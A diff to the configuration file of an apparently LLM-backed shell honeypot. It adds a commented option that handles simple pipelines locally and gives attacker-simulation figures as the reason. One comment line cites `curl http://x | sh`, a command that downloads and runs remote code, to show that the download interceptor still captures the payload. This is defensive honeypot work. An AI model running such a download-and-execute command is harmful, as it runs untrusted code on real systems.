@@ -553,6 +553,23 @@ log_raw = false
 # (default: true)
 #deterministic_responses = true
 
+# Handle simple pipelines locally: run the command through the
+# deterministic responder, then apply the filter stages the way a real
+# shell would (head, tail, grep, wc). Without this, ANY command containing
+# a pipe fell through to the LLM even when the emulator answers its
+# unpiped form perfectly -- 19% of LLM-bound traffic across our attacker
+# simulation was exactly that, including two of the three repeat probes in
+# the fingerprint adversary, which is the worst place to be improvising.
+# Handling them locally makes those answers instant, free and identical
+# every time they are asked.
+#
+# Deliberately conservative: an unmodelled filter or flag defers the whole
+# pipeline to the LLM rather than guessing, and the first stage must be a
+# command the emulator recognizes -- so `curl http://x | sh` still reaches
+# the download interceptor and its payload is still captured.
+# (default: true)
+#pipe_filters = true
+
 # Full-screen interactive programs. top/htop, vi/vim, and less/more take
 # over the terminal (alternate screen + raw keystrokes) instead of being
 # narrated one-shot by the LLM — the classic vim/top honeypot tell. The
